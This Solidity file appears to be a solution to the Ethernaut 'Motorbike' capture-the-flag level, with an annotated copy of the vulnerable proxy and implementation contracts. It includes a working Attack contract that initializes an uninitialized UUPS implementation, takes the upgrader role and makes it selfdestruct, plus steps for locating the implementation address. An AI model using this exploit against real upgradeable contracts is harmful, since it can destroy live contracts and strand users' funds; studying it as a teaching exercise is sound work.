// SPDX-License-Identifier: MIT

// pragma solidity <0.7.0;
//import "openzeppelin-contracts-06/utils/Address.sol";
//import "openzeppelin-contracts-06/proxy/Initializable.sol";

// Tried with 0.8.20:
// pragma solidity 0.8.20;
// import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
// import "@openzeppelin/contracts/utils/Address.sol";

// Use interfaces
pragma solidity ^0.8;

// How to run:
// Deploy instance from OpenZeppelin and get the contract address: 0xdED6DC7A7A89484dA0bb05b10D94D61fBBcb91A4.
// Get storage: await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// Results in: 0x00000000000000000000000023ad22bdddfac164556a26e8d818c29d6471347e
// This is the contract addresss of the implementation contract: 0x23ad22bdddfac164556a26e8d818c29d6471347e
// Next deploy the attack contract
// Call the attack function with CA of implementation contract as input


interface IMotorbike {
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
}

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}


contract Attack {
    function attack(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.deleteContract.selector));
    }

    function deleteContract() external {
        selfdestruct(payable(address(0)));
    }
}

// This code contains two contracts: Motorbike and Engine
// The Motorbike contract is a proxy contract that delegates calls to an implementation contract (Engine) using the EIP-1967 standard
// Use delegatecall in Motorbike to call Engine

// EIP-1967:
// Standard for storage layout in proxy contracts to avoid conflicts.
// Uses predefined storage slots for implementation address and other metadata.



// Call initialize on Engine to set up the initial state.
// Use upgradeToAndCall to update the logic contract while keeping the proxy intact.

// contract Motorbike {
//     // 1. Implementation slot
//     // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1: The keccak256 function generates a unique hash for the string "eip1967.proxy.implementation".
//     // Subtracting 1 ensures this value does not collide with possible hash values used in other contexts (like variable names).
//     // Smart contracts use a flat storage layout. If multiple contracts or libraries use the same storage slot, their data can collide and overwrite each other.
//     // Using a deterministic but unique key derived from a fixed standard (EIP-1967) ensures no unintentional collisions occur.
//     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;



//     struct AddressSlot {
//         address value;
//     }

//     // 2. Constructor
//     // The constructor initializes the proxy with the address of the implementation contract
//     // It stores the implementation address in the _IMPLEMENTATION_SLOT.
//     // It calls the initialize function of the implementation contract using delegatecall.
//     constructor(address _logic) public {
//         require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
//         _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
//         (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
//         require(success, "Call failed");
//     }

//     // 3. Delegate call function
//     // Delegates the current call to `implementation`.
//     // Uses inline assembly to forward the calldata to the implementation.
//     function _delegate(address implementation) internal virtual {
//         // solhint-disable-next-line no-inline-assembly
//         assembly {
//             calldatacopy(0, 0, calldatasize())
//             let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
//             returndatacopy(0, 0, returndatasize())
//             switch result
//             case 0 { revert(0, returndatasize()) }
//             default { return(0, returndatasize()) }
//         }
//     }

//     // 4. Fallback function
//     // Fallback function that delegates calls to the address returned by `_implementation()`.
//     // Will run if no other function in the contract matches the call data
//     fallback() external payable virtual {
//         _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
//     }


//     // Returns an `AddressSlot` with member `value` located at `slot`.
//     function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
//         assembly {
//             r_slot := slot
//         }
//     }
// }

// contract Engine is Initializable {
//     // The Engine contract implements the logic and state that the Motorbike proxy delegates to.
//     // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
//     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

//     address public upgrader;
//     uint256 public horsePower;

//     struct AddressSlot {
//         address value;
//     }

//     // The initialize function sets the initial state variables (horsePower and upgrader) and 
//     // ensures it can only be called once (using initializer from Initializable).
//     function initialize() external initializer {
//         horsePower = 1000;
//         upgrader = msg.sender;
//     }

//     // Allows the upgrader to change the implementation to newImplementation and optionally call a setup function (data).
//     // Upgrade the implementation of the proxy to `newImplementation`
//     // subsequently execute the function call
//     function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
//         _authorizeUpgrade();
//         _upgradeToAndCall(newImplementation, data);
//     }

//     // Restrict to upgrader role: Ensures only the upgrader can upgrade the implementation.
//     // We need to become the upgrader
//     function _authorizeUpgrade() internal view {
//         require(msg.sender == upgrader, "Can't upgrade");
//     }

//     // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
//     function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
//         // Initial upgrade and setup call
//         _setImplementation(newImplementation);
//         if (data.length > 0) {
//             (bool success,) = newImplementation.delegatecall(data);
//             require(success, "Call failed");
//         }
//     }

//     // _setImplementation updates the _IMPLEMENTATION_SLOT with the new address.
//     // _upgradeToAndCall performs the upgrade and optionally executes a setup call on the new implementation
//     // Stores a new address in the EIP1967 implementation slot.
//     // Here the IMPLEMENTATION SLOT is updated
//     function _setImplementation(address newImplementation) private {
//         require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

//         AddressSlot storage r;
//         assembly {
//             r_slot := _IMPLEMENTATION_SLOT
//         }
//         r.value = newImplementation;
//     }
// }